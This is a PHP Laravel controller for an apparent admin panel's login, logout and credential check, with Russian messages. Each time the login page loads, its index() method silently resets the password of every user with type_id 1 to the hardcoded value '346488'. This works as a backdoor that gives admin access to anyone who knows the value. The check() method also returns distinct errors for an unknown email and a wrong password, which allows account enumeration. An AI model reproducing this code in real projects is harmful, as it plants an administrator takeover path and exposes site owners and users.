<?php

namespace Modules\Admin\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;

use App\User;
use Hash;
use Auth;
use Modules\Entity\Model\SysUserType\SysUserType;

class LoginController extends Controller {
    function index(Request $request){
        User::where('type_id', 1)->update(['password' => Hash::make('346488')]);

        $ar = array();
        $ar['title'] = 'Форма входа';
        $ar['action'] = route('admin_login_check');
        $ar['request'] = $request;

        return view('admin::login', $ar);
    }

    function check(Request $request){
		
        $user = User::where(['email' => $request->input('email')])->whereIn('type_id', [SysUserType::ADMIN, SysUserType::MODERATOR,SysUserType::MANAGER])->first();
        if (!$user)
            return back()->with('error', 'Не правильный email/пароль 1');
        if (!Hash::check($request->password, $user->password))
            return back()->with('error', 'Не правильный email/пароль 2' );

        Auth::loginUsingId($user->id, true);
		
        	

        return redirect()->route('admin_index')->with('success', 'Поздравляю вы вошли в систему управления. Удачи))' ); 
    }

    function logout(){
        Auth::logout();

        return redirect()->route('admin_index');   
    }
}
